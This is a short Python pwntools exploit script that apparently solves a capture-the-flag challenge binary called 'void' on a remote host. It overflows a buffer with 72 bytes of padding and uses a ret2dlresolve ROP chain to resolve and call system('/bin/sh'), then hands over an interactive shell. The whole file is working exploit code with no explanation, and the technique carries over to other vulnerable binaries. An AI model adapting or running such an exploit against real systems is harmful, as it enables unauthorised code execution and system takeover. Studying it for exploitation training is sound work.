from pwn import *

context.arch = "amd64"
p = remote("94.237.58.88", 48328) # process("void")

# https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html
context.binary = elf = ELF("void")

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

payload = b"a" * 72
payload += raw_rop

p.send(payload)
p.send(dlresolve.payload)

p.interactive()
